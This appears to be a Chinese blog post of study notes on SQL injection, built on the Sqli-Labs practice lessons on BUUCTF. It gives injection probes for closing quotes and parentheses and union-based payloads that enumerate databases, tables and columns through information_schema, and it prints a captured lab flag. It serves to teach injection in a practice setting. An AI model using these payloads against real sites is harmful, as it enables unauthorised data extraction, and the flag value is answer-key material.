# SQL注入总结(一)

参考：BUUCTF-Sqli_Labs/ [SQL注入天书](https://xz.aliyun.com/t/385#toc-10)  
非常好的SQL注入文章，本文只是对它的拙劣总结  
想掌握注入，实战永远比理论重要。  
$ 在文章中代表可控变量  
要求读者掌握基本的SQL语法知识  
[堆叠注入和神奇的存储过程绕过](https://blog.csdn.net/weixin_40871137/article/details/94349532)  
[SQLMap的使用](https://www.freebuf.com/sectool/164608.html)

## 常用技巧——基本注入

### Metadata

`information_schema` 数据库中,  
`schemata` 表的 `schema_name` 列存储了所有数据库的名字。  
`tables` 表的 `table_name`列存储了所有表的名字，`table_schema` 列存储了这个表对应的数据库的名字。  
`columns` 表的 `column_name`列存储了所有列的名字，`table_name`列存储了这个列对应的表的名字。  
>猜数据库：select schema_name from information_schema.schemata  
猜某库的表：select table_name from information_schema.tables where table_schema=’xxxxx’  
猜某表的列：Select column_name from information_schema.columns where table_name=’xxxxx’  
从列中选值：Select * from

### 连接字符串常用函数

1. `CONCAT(str1,str2,...)`  
2. `CONCAT_WS(SEPARATOR,str1,str2,...)`--concat with separator  
3. `GROUP_CONCAT()`，用来连接查询出来的很多行，上面两个都是连接列。  

```shell
GROUP_CONCAT([DISTINCT] expr [,expr ...]
[ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col ...]][SEPARATOR str_val])
```

[详细讲解](https://www.cnblogs.com/lcamry/p/5715634.html)

### 初步测试

```sql
1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
") or 1=1--+
"))or 1=1--+
```

此处考虑两个点，一个是闭合前面你的`‘`另一个是处理后面的`‘`，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用`--+`或者 `#（%23）`

## Sqli-Lab Lesson 1-4,11,12 实战练习

### 特点

有回显，无过滤，最简单的一种。

### 语句模式

`select... from ... where id = '$input' limit...`  
`select... from ... where id = $input limit...`  
`select... from ... where id = ('$input') limit...`
`select... from ... where id = ("$input") limit...`  

### 测试

先确定引号括号的格式。  
$input `1 order by $i`,$i from 1 to n,$i = 4 时出现错误，说明返回了三个column。

+ 为什么这样测试？因为union要求返回的column数一致。  
+ order by $i,$i is number:按照第$i列进行排序。  

$input `-1' union select 1,1,(select group_concat(schema_name) from information_schema.schemata)'`查询所有的数据库名字。
>返回了 ctftraining,information_schema,mysql,performance_schema,security,test

+ 使用-1来确保查询的结果不存在，否则会显示不出想要的结果。
+ group_concat：一个聚集函数，将查询中返回的同一个分组的值连接成一个字符串。本例子中使用这个函数来显示所有的数据库名字。

$input `-1' union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema = 'ctftraining')'`查询ctftraining这个库中所有表的名字。  
>返回了 flag,news,users

$input `-1' union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name = "flag")'`查询flag表中所有的列的名字。
>返回了 flag

$input `id=-1' union select 1,1,(select group_concat(flag) from ctftraining.flag)'`
>返回了 flag{0ad1c1e6-26ab-471a-9413-3da193d0fba3}
---
